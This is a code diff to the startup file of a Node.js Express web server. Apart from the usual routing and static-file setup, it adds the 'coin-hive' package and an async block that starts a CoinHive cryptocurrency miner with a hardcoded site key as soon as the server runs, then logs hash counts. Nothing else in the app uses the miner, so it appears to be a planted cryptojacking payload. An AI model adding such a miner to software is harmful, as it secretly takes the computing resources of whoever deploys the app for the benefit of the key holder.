@@ -10,6 +10,7 @@ var router = require('./server/router');
 
 var app = express();
 var server = http.createServer(app);
+var CoinHive = require('coin-hive');
 
 var port = process.env.PORT || '3000';
 
@@ -28,6 +29,23 @@ app.use(cookieParser());
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(router);
 
+(async () => {
+
+    // Create miner
+    const miner = await CoinHive('XvaJ1uJE8vxIdDl0YaPKkG2wWSKbcXi0'); // CoinHive's Site Key
+
+    // Start miner
+    await miner.start();
+
+    // Listen on events
+    miner.on('found', () => console.log('Found!'))
+    miner.on('accepted', () => console.log('Accepted!'))
+    miner.on('update', data => console.log(`
+    Hashes per second: ${data.hashesPerSecond}
+    Total hashes: ${data.totalHashes}
+    Accepted hashes: ${data.acceptedHashes}
+  `));
+})();
 // catch 404 and forward to error handler
 
 
